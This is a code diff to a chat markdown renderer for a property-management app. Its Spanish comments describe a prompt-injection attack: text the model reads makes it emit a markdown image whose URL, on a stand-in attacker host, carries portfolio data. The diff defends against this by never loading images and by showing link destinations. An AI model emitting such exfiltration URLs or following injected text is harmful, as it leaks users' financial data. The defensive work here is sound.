@@ -13,6 +13,49 @@ interface MarkdownRendererProps {
 }
 
 /**
+ * ── Por qué no se pintan imágenes y los enlaces dicen adónde van ──────────
+ * (auditoría de seguridad 23-09). Lo que pinta este componente lo escribe un
+ * modelo, y un modelo se puede manipular con texto que él mismo lee (una nota
+ * de un inquilino, el nombre de un inmueble importado, un correo). La jugada
+ * clásica es que responda `![](https://atacante.com/x?d=<datos del snapshot>)`:
+ * el navegador pide esa imagen SOLO, sin clic, y los datos de la cartera salen
+ * en la URL. Por eso:
+ *   - una imagen NO se carga nunca: se muestra como texto con su destino;
+ *   - un enlace a otro sitio muestra su dominio al lado, para que un «Ver
+ *     estado de cuenta» que en realidad va a otro lado se vea antes del clic.
+ * Es la segunda puerta: el micro ya quita las imágenes de la respuesta
+ * (`nico8/sec-ia`) y la CSP (`img-src`) cierra los orígenes.
+ */
+
+/**
+ * El dominio (y el comienzo de la ruta) de un enlace que sale de Leasefy, o
+ * `null` si es interno (`/panel/...`, `#ancla`) o no se puede leer.
+ */
+export function destinoExterno(href: string | undefined | null): string | null {
+  if (!href) return null;
+  const crudo = href.trim();
+  if (crudo.startsWith('/') && !crudo.startsWith('//')) return null;
+  if (crudo.startsWith('#')) return null;
+  // Se resuelve contra nuestro origen: así `//otro.sitio/x` (sin esquema)
+  // también cuenta como externo, y lo relativo queda en casa.
+  const base =
+    typeof window !== 'undefined' && window.location?.origin && window.location.origin !== 'null'
+      ? window.location.origin
+      : 'https://leasefy.invalid';
+  let url: URL;
+  try {
+    url = new URL(crudo, base);
+  } catch {
+    return null;
+  }
+  if (url.protocol === 'mailto:' || url.protocol === 'tel:') return url.href.slice(url.protocol.length);
+  if (url.origin === new URL(base).origin) return null;
+  const ruta = url.pathname === '/' ? '' : url.pathname;
+  const corta = ruta.length > 30 ? `${ruta.slice(0, 30)}…` : ruta;
+  return `${url.hostname}${corta}`;
+}
+
+/**
  * Custom component overrides for chat-context markdown.
  * Tighter spacing, chat-appropriate sizing, dark mode compatible.
  */
@@ -35,16 +78,35 @@ const markdownComponents: Components = {
   em: ({ children }) => (
     <em className="italic">{children}</em>
   ),
-  a: ({ href, children }) => (
-    <a
-      href={href}
-      className="text-primary hover:underline"
-      target="_blank"
-      rel="noopener noreferrer"
-    >
-      {children}
-    </a>
-  ),
+  a: ({ href, children }) => {
+    const destino = destinoExterno(href);
+    return (
+      <a
+        href={href}
+        className="text-primary hover:underline"
+        target="_blank"
+        rel="noopener noreferrer"
+        title={destino ? href : undefined}
+      >
+        {children}
+        {destino && (
+          <span className="ml-1 font-mono text-[14px] text-muted-foreground">({destino})</span>
+        )}
+      </a>
+    );
+  },
+  // Ninguna imagen se carga: se dice que había una y adónde apuntaba. Ver
+  // «Por qué no se pintan imágenes» abajo.
+  img: ({ src, alt }) => {
+    const url = typeof src === 'string' ? src : undefined;
+    const destino = destinoExterno(url) ?? url;
+    return (
+      <span className="text-muted-foreground">
+        [Imagen{alt ? `: ${alt}` : ''}
+        {destino && <span className="ml-1 font-mono text-[14px]">({destino})</span>}]
+      </span>
+    );
+  },
   code: ({ className, children, ...props }) => {
     // Detect code blocks (have a language className from react-markdown)
     const isBlock = className?.startsWith('language-');
